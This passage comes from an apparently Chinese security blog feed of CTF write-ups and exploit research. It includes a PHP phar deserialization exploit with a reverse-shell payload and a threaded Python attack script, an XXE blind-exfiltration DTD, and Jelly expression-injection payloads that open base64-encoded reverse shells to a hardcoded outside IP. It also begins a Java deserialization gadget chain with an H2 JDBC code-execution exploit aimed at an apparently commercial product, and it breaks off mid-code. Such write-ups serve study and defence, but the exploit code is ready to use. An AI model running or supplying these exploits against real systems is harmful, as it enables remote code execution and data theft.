src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/465edd36a06a709f9089ed05c251af98.png"></p><p>然后copy是可以使用伪协议的，使用伪协议+copy将内容复制到<code>/tmp/tmp.tmp</code>中，同时把不可控的部分消除掉，这里用到php exit死亡绕过的知识点。</p><p>可控内容之前的<code>upload_process_</code>字段，添加<code>aaaaaa</code>后，三次base64即可置空<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/68da51ec0b0e361e9a3438afaaf6d3d4.png"></p><p>可控内容之后，用<code>string.strip_tags</code>过滤器可以全部清除掉，只需在可控部分之后加个<code>&lt;</code>即可</p><p>payload构造： <code>aaaaaa</code>+base64_encode(base64_encode(base64_encode(payload))) + <code>&lt;</code></p><p>payload触发：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/string.strip_tags|convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/tmp/sess_jasper</span></span><br></pre></td></tr></table></figure><p>至此实现了&#x2F;tmp&#x2F;tmp.tmp任意写， 于是构造<code>exp.phar</code>文件，里面包含Admin类的序列化字符串，再使用phar伪协议触发反序列化，实现代码执行。</p><p>构造phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Admin can play everything!&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;exp.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp.phar&quot;</span>);                  <span class="comment">// 后缀名必须为 phar，生成之后可以修改</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">// 设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Admin</span>(<span class="string">&quot;system(&#x27; bash -c \&quot;bash -i &gt;&amp; /dev/tcp/*.*.*.*/9999 0&gt;&amp;1\&quot;&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);                         <span class="comment">// 将自定义的 meta-data 存入 manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;jasper&quot;</span>, <span class="string">&quot;123&quot;</span>);       <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">                                                    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pharContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;exp.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$b64</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$pharContent</span>)));</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;bbbbbb&quot;</span>.<span class="variable">$b64</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="string">&#x27;&lt;&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>python脚本一键利用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;jasper1&#x27;</span></span><br><span class="line"><span class="comment"># url = &#x27;http://127.0.0.1:8888/index.php&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://125.70.243.22:31293/index.php&quot;</span></span><br><span class="line"><span class="comment">## read flag</span></span><br><span class="line">phar_payload = <span class="string">&quot;bbbbbbVUVRNWQyRklRV2RZTVRsSlVWVjRWVmd3VGxCVVZrSktWRVZXVTB0RGF6ZEpSRGdyUkZGd2RFRkJRVUZCVVVGQlFVSkZRVUZCUVVKQlFVRkJRVUZCTlVGQlFVRlVlbTh4VDJsS1FscEhNWEJpYVVrMlRWUndOMk42YnpCUGFVcHFZakpTYkVscWRIcFBha2w1VDJsS2VtVllUakJhVnpCdlNuazVlVnBYUm10ak1sWnFZMjFXTUVwNWF6ZEphblE1UW1kQlFVRkhjR2hqTTBKc1kyZE5RVUZCUkU5d01WSnVRWGRCUVVGT1NtcFRTV2t5UVZGQlFVRkJRVUZCUkVWNVRTOWtkbll5V1hoSE5GaE9jRXBPTHpWWmFFWlBXRGx4ZUdFMGMwRm5RVUZCUldSRFZGVkpQUT09&lt;&quot;</span></span><br><span class="line"><span class="comment"># reverse shell</span></span><br><span class="line"><span class="comment"># phar_payload = &quot;bbbbbbVUVRNWQyRklRV2RZTVRsSlVWVjRWVmd3VGxCVVZrSktWRVZXVTB0RGF6ZEpSRGdyUkZGeFdFRkJRVUZCVVVGQlFVSkZRVUZCUVVKQlFVRkJRVUZDYWtGQlFVRlVlbTh4VDJsS1FscEhNWEJpYVVrMlRWUndOMk42YnpCUGFVcHFZakpTYkVscWRIcFBhbGt3VDJsS2VtVllUakJhVnpCdlNubENhVmxZVG05SlF6RnFTVU5LYVZsWVRtOUpRekZ3U1VRMGJVbERPV3RhV0ZsMlpFZE9kMHg2UlhoT2FUUXlUV2swZWs5RE5ETk5VemcxVDFSck5VbEVRU3RLYWtWcFNubHJOMGxxZERsQ1owRkJRVWR3YUdNelFteGpaMDFCUVVGRFVqRnNVbTVCZDBGQlFVNUthbE5KYVRKQlVVRkJRVUZCUVVGRVJYbE5lV2xOVG5GMGFFaElOMmhyT0Uxa1EwZFJjM2hGY1hORE1XZDBRV2RCUVVGRlpFTlVWVWs5&lt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局事件，用于协调线程退出</span></span><br><span class="line">stop_event = threading.Event()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_session_file</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            url,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: phar_payload&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">copy_to_tmp</span>(<span class="params">session</span>):</span><br><span class="line">    payload = <span class="string">&quot;?filename=php://filter/string.strip_tags|convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/tmp/sess_&quot;</span> + sessid</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        res = requests.get(url + payload, cookies=session.cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Well done!&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 恶意phar已copy到/tmp/tmp.tmp ...&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 拷贝失败！&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">or</span> <span class="string">&quot;D0g3xGC&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            stop_event.<span class="built_in">set</span>()  <span class="comment">## 设置退出事件</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser_phar</span>(<span class="params">session</span>):</span><br><span class="line">    payload = <span class="string">&quot;?filename=phar:///tmp/tmp.tmp/jasper&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        res = requests.get(url + payload, cookies=session.cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> res.text <span class="keyword">or</span> <span class="string">&quot;D0g3xGC&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 利用成功！&quot;</span>)</span><br><span class="line">            stop_event.<span class="built_in">set</span>()  <span class="comment">## 设置退出事件</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并启动线程</span></span><br><span class="line">write_thread = threading.Thread(target=write_session_file, args=(session,))</span><br><span class="line">write_thread.daemon = <span class="literal">True</span></span><br><span class="line">write_thread.start()</span><br><span class="line"></span><br><span class="line">copy_thread = threading.Thread(target=copy_to_tmp, args=(session,))</span><br><span class="line">copy_thread.daemon = <span class="literal">True</span></span><br><span class="line">copy_thread.start()</span><br><span class="line"></span><br><span class="line">unser_thread = threading.Thread(target=unser_phar, args=(session,))</span><br><span class="line">unser_thread.daemon = <span class="literal">True</span></span><br><span class="line">unser_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主线程保持活跃，等待子线程结束</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/92c3e03d438a822ac2fa4370005d0346.png"></p><h2 id="easy-jelly"><a href="#easy-jelly" class="headerlink" title="easy_jelly"></a>easy_jelly</h2><h3 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name easy_jelly -d -p 8081:80 sketchpl4ne/gcb2024:easy_jelly_img</span><br></pre></td></tr></table></figure><p>PS：物理机起环境的时候注意下，lib要删除<code>servlet-api-2.3.jar</code>，依赖有冲突。</p><h3 id="解题思路1-2"><a href="#解题思路1-2" class="headerlink" title="解题思路1"></a>解题思路1</h3><p><strong>思路：非预期，xxe 盲打，有老六</strong><br>exp1.xml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;!DOCTYPE</span> <span class="string">test</span> [</span><br><span class="line"><span class="string">&lt;!ENTITY</span> <span class="string">%</span> <span class="string">file</span> <span class="string">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span><span class="string">&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY</span> <span class="string">%</span> <span class="string">dtd</span> <span class="string">SYSTEM</span> <span class="string">&quot;http://116.62.38.71:7777/evil.dtd&quot;</span><span class="string">&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line">]<span class="string">&gt;</span></span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://116.62.38.71:7777/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/68a37e27e4a3b7fc460d932523986c35.png"></p><h3 id="解题思路2-2"><a href="#解题思路2-2" class="headerlink" title="解题思路2"></a>解题思路2</h3><p><strong>思路：jexl表达式注入</strong></p><p>exp2.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">j:jelly</span> <span class="attr">xmlns:j</span>=<span class="string">&quot;jelly:core&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">j:getStatic</span> <span class="attr">var</span>=<span class="string">&quot;str&quot;</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">className</span>=<span class="string">&quot;org.apache.commons.jelly.servlet.JellyServlet&quot;</span> <span class="attr">field</span>=<span class="string">&quot;REQUEST&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">j:break</span> <span class="attr">test</span>=<span class="string">&quot;$&#123;str .class</span></span></span><br><span class="line"><span class="string"><span class="tag">.forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance() .getEngineByName(&#x27;js&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="tag">.eval(&#x27;java.lang.Runtime.getRuntime().exec(<span class="symbol">&amp;quot;</span> bash -c `&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMzguNzEvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;` <span class="symbol">&amp;quot;</span>)&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">j:break</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">j:jelly</span>&gt;</span></span><br></pre></td></tr></table></figure><p>另一个payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">j:jelly</span> <span class="attr">xmlns:j</span>=<span class="string">&quot;jelly:core&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">j:getStatic</span> <span class="attr">var</span>=<span class="string">&quot;str&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">className</span>=<span class="string">&quot;org.apache.commons.jelly.servlet.JellyServlet&quot;</span> <span class="attr">field</span>=<span class="string">&quot;REQUEST&quot;</span>/&gt;</span> <span class="tag">&lt;<span class="name">j:whitespace</span>&gt;</span>$&#123;str</span><br><span class="line">.class</span><br><span class="line">.forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance() .getEngineByName(&#x27;js&#x27;)</span><br><span class="line">.eval(&#x27;java.lang.Runtime.getRuntime().exec(<span class="symbol">&amp;quot;</span>  bash -c `&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMzguNzEvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;` <span class="symbol">&amp;quot;</span>)&#x27;)&#125;<span class="tag">&lt;/<span class="name">j:whitespace</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">j:jelly</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/05912db436951a1e3034029919e75d82.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>官方wp：道格安全公众号</li><li>悠悠神的wp</li><li>p2zhh爷的wp</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt; &lt;a href=&quot;https://xmcve.com/&quot;&gt;星盟安全团队&lt;/a&gt;长期招新中~ 我们的目标是星辰大海！ &lt;/p&gt;
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="php" scheme="https://jaspersec.top/tags/php/"/>
    
    <category term="wp" scheme="https://jaspersec.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>某v10 channel 反序列化 出网通杀</title>
    <link href="https://jaspersec.top/posts/1135273246.html"/>
    <id>https://jaspersec.top/posts/1135273246.html</id>
    <published>2024-08-20T17:57:00.000Z</published>
    <updated>2025-03-31T22:09:47.238Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>分两块讲，第一个是反序列化点，第二个是绕黑名单的新链子。</p><h3 id="Hashtable链"><a href="#Hashtable链" class="headerlink" title="Hashtable链"></a>Hashtable链</h3><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>利用链如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hashtable#readObject -&gt; </span><br><span class="line">Hashtable#reconstitutionPut -&gt; </span><br><span class="line">abstractMap#equals -&gt; </span><br><span class="line">TextAndMnemonicHashMap#get -&gt; </span><br><span class="line">com.fr.json.JSONArray#toString -&gt;  com.fr.third.alibaba.druid.pool.xa.DruidXADataSource#getXConnection</span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">createPhysicalConnection:<span class="number">1826</span>, DruidAbstractDataSource (com.alibaba.druid.pool)</span><br><span class="line">init:<span class="number">936</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1473</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1469</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getXAConnection:<span class="number">42</span>, DruidXADataSource (com.alibaba.druid.pool.xa)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">688</span>, BeanPropertyWriter (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">772</span>, BeanSerializerBase (com.fr.third.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeContents:<span class="number">119</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">79</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">18</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">_serialize:<span class="number">479</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">318</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">_writeValueAndClose:<span class="number">4719</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">3964</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">encode:<span class="number">99</span>, EmbedJson (com.fr.json.revise)</span><br><span class="line">encode:<span class="number">560</span>, JSONArray (com.fr.json)</span><br><span class="line">toString:<span class="number">590</span>, JSONArray (com.fr.json)</span><br><span class="line">get:<span class="number">1251</span>, UIDefaults$TextAndMnemonicHashMap (javax.swing)</span><br><span class="line">equals:<span class="number">492</span>, AbstractMap (java.util)</span><br><span class="line">reconstitutionPut:<span class="number">1241</span>, Hashtable (java.util)</span><br><span class="line">readObject:<span class="number">1215</span>, Hashtable (java.util)</span><br></pre></td></tr></table></figure><p>EXP（h2 jdbc attack）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidAbstractDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> utils.SerializeUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">h2Attack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">DruidXADataSource</span> <span class="variable">druidXADataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line">        druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line">        druidXADataSource.setUrl(url);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        druidXADataSource.getXAConnection();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过jackson触发getter即getXAConnection()，JSONArray的toString会调用jackson原生反序列化</span></span><br><span class="line">        <span class="comment">//即writeValueAsString，从而触发getter</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(druidXADataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(arrayList);</span><br><span class="line"><span class="comment">//        objects.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap1</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap2</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发UIDefaults$TextAndMnemonicHashMap#get方法</span></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        